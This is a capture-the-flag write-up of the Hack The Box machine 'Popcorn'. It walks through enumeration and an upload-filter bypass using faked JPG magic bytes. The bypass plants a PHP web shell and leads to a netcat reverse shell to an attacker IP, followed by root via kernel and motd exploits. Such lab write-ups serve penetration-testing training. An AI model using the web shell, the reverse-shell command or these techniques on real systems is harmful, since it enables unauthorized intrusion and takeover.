## Enumerations 

### Nmap scan

```bash
nmap -sV -A -T4 -vv -oN nmap.scans 10.10.10.6
```

There were 2 port open under 1000 ports 

- port 80
- port 22

### Port 80

port 80 website looked like this here

Did a `dirseach` using the following command 

```yaml
gobuster dir -u http://popcorn.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

```

I discovered a webpage torrent within the browser, located in the `\torrent` directory.

![Alt text](/assets/img/htb/Popcorn/pp4.png)

I attempted to log in using the credentials `admin` for both username and password, captured the request, and then used SQLMap to test for SQL injection vulnerabilities.

```yaml
sqlmap -r login.req
```

### torrent directory

On the webpage, when I attempted to upload a PNG image, I encountered an error  due to either file sanitization processes or restrictions on the types of permissible files.

Tried to upload a file with a `.torrent` extension, and the upload was successful.but I couldn't find where the file was processed so it was a rabbit hole

![Alt text](/assets/img/htb/Popcorn/pp8.png)

After pocking around ,I discovered an upload folder containing PNG screenshots.

![Alt text](/assets/img/htb/Popcorn/pp9.png)


So, I proceeded to attempt to edit the screenshot image.

and the screenshot was successfully saved in the upload folder.

When attempting to upload an LFI PHP script, we encountered an `Invalid file` error, likely due to file sanitization measures.

### LFI

```yaml
 <?php system($_GET['lfi']); ?>
```
![Alt text](/assets/img/htb/Popcorn/pp13.png)


Checking the previously uploaded files, it appears that the backend only accepts files in `.jpg `format.

![Alt text](/assets/img/htb/Popcorn/pp12.png)

So, I tricked the server by modifying the headers of the PHP file to match the magic bytes of a JPG file.

![Alt text](/assets/img/htb/Popcorn/pp14.png)

In Burp, I made the following modifications in order to trick the server into thinking that the file is a JPEG.[link](https://en.wikipedia.org/wiki/List_of_file_signatures)

![Alt text](/assets/img/htb/Popcorn/pp15.png)

and I had a success , so I checked the `uploads` directory and confirmed that the file was indeed uploaded.

Now, with the URL, we have achieved command execution.

![Alt text](/assets/img/htb/Popcorn/pp17.png)

To establish a more robust shell, I utilized `nc` (netcat) to obtain a reverse shell.

```yaml
nc -c /bin/bash 10.10.16.15 4444
```
After encoding it in URL format, I executed it via Burp and successfully gained a shell.

During manual enumeration, no credentials were discovered. However, upon uploading LinPEAS, credentials were found.

![Alt text](/assets/img/htb/Popcorn/pp19.png)

checking MySQL, we found a database named `torrenthoster`.

![Alt text](/assets/img/htb/Popcorn/pp20.png)



In the torrenthoster database, there was a table named users containing the following credentials, although they were no of use.

### To Root method 1

![Alt text](/assets/img/htb/Popcorn/pp21.png)

After running linux-exploit-suggester we had this `full-nelson` which  was promising

![Alt text](/assets/img/htb/Popcorn/pp22.png)


After downloading the exploit, I compiled it using GCC, then executed it, which resulted in obtaining root access.

![Alt text](/assets/img/htb/Popcorn/pp23.png)


### Method 2

Using the find command to list files owned by George, I noticed something unusual: the presence of the `motd` file.
```bash
find / -user george 2>/dev/null
```
![Alt text](/assets/img/htb/Popcorn/pp24.png)

Searching in Searchsploit, we found an exploit related to binary-to-root privilege escalation, specifically targeting version number `Release: 9.10.`

![Alt text](/assets/img/htb/Popcorn/pp25.png)

After downloading the exploit onto the machine, I executed it, and as a result, I gained root access.
